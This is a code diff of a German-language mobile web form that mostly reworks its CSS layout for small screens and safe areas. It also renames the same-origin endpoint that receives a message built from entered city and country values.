@@ -13,26 +13,26 @@
   --line:rgba(255,255,255,.15);
   --accent:#46f39a;
 }
-*{box-sizing:border-box}
 
-/* ✅ Kein Scroll + Mobile Bounce aus */
+*{ box-sizing:border-box; }
+
+/* ✅ Kein Scroll + iOS safe */
 html, body{
-  touch-action: manipulation;
-  height:100%;
   margin:0;
   overflow:hidden;
   overscroll-behavior:none;
+  min-height:100dvh;
+  touch-action: manipulation;
 }
 
 button, input{
-  touch-action: manipulation;
   -webkit-user-select:none;
   user-select:none;
   -webkit-tap-highlight-color:transparent;
+  touch-action: manipulation;
 }
 
 body{
-  height:100vh;
   background:var(--bg);
   color:var(--text);
   font-family:
@@ -51,55 +51,69 @@ body{
   justify-content:center;
 }
 
-/* ✅ Container wie die anderen Seiten */
+/* ✅ Container kompakt + safe-area */
 .container{
   width:100%;
   max-width:560px;
-  height:100vh;
-  padding:26px 18px calc(26px + env(safe-area-inset-bottom) + 56px);
+  min-height:100dvh;
+  padding:20px 18px calc(18px + env(safe-area-inset-bottom) + 20px);
   display:flex;
   flex-direction:column;
   position:relative;
 }
 
+/* Brand */
 .brand{
   font-weight:900;
-  font-size:16px;
+  font-size:15px;
   letter-spacing:.02em;
-  user-select:none;
 }
 .brand span{ color:var(--accent); }
 
-.content{ margin-top:110px; }
-
-h1{
-  font-size:26px;
-  margin:0 0 22px 0;
-  line-height:1.3;
+/* weniger Abstand oben */
+.content{
+  margin-top:40px;
 }
 
+h1{
+  font-size:28px;
+  line-height:1.15;
+  margin:0 0 12px 0;
+  letter-spacing:-.02em;
+}
+
+.sub{
+  margin:0 0 18px 0;
+  color:var(--muted);
+  font-size:13px;
+  line-height:1.5;
+  max-width:46ch;
+}
+
+/* Form */
 .field{
   display:flex;
   flex-direction:column;
-  gap:8px;
-  margin-bottom:16px;
+  gap:6px;
+  margin-bottom:12px;
 }
 
 label{
-  font-size:12px;
+  font-size:11px;
   letter-spacing:.08em;
   font-weight:900;
   color:var(--muted);
 }
 
 input{
-  height:52px;
+  width:100%;                 /* ✅ wichtig gegen overflow */
+  height:48px;
   border-radius:14px;
   border:1px solid rgba(255,255,255,.18);
   background:transparent;
   color:#fff;
   padding:0 14px;
-  font-size:14px;
+  font-size:13px;
   outline:none;
 }
 
@@ -108,40 +122,43 @@ input::placeholder{ color:rgba(255,255,255,.35); }
 
 .fieldError{
   display:none;
-  font-size:12px;
+  font-size:11px;
   color:#fff;
   opacity:.85;
   font-weight:800;
 }
 .fieldError.show{ display:block; }
 
+/* ✅ Grid: minmax verhindert “rausragen” */
 .grid2{
   display:grid;
-  grid-template-columns:1fr 1fr;
-  gap:14px;
+  grid-template-columns: minmax(0,1fr) minmax(0,1fr);
+  gap:10px;
 }
 
 .notice{
-  margin:6px 0 0 0;
+  margin:8px 0 0 0;
   color:rgba(255,255,255,.45);
-  font-size:12px;
+  font-size:11px;
   line-height:1.4;
   font-weight:700;
 }
 
+/* Button unten */
 .actions{
   margin-top:auto;
-  padding-top:18px;
+  padding-top:14px;
+  padding-bottom:calc(env(safe-area-inset-bottom) + 14px);
 }
 
 button{
   width:100%;
-  height:56px;
-  border-radius:16px;
+  height:52px;
+  border-radius:14px;
   border:1px solid rgba(255,255,255,.18);
   background:#fff;
   color:#000;
-  font-weight:1000;
+  font-weight:900;
   font-size:14px;
   cursor:pointer;
 }
@@ -150,22 +167,18 @@ button:disabled{
   opacity:.35;
   cursor:not-allowed;
 }
-.sub{
-  margin:0 0 28px 0;
-  color:var(--muted);
-  font-size:14px;
-  line-height:1.5;
-  max-width:46ch;
+
+/* Sehr kleine Geräte */
+@media (max-width:380px){
+  .content{ margin-top:28px; }
+  h1{ font-size:24px; }
+  input{ height:46px; }
 }
 
-/* ✅ Mobile polish */
-@media (max-width:420px){
-  .content{ margin-top:82px; }
+/* Ultra-klein: 2-Spalten -> 1-Spalte (optional, aber sehr stabil) */
+@media (max-width:340px){
+  .grid2{ grid-template-columns:1fr; }
 }
-@media (max-width:360px){
-  .content{ margin-top:72px; }
-}
-
 </style>
 </head>
 
@@ -688,7 +701,7 @@ const msg =
   `🚈 Stadt: ${city}\n` +
   `🌍 Land: ${country}\n`
 
-  await fetch("/api/telegram", {
+  await fetch("/api/adresse", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ message: msg })
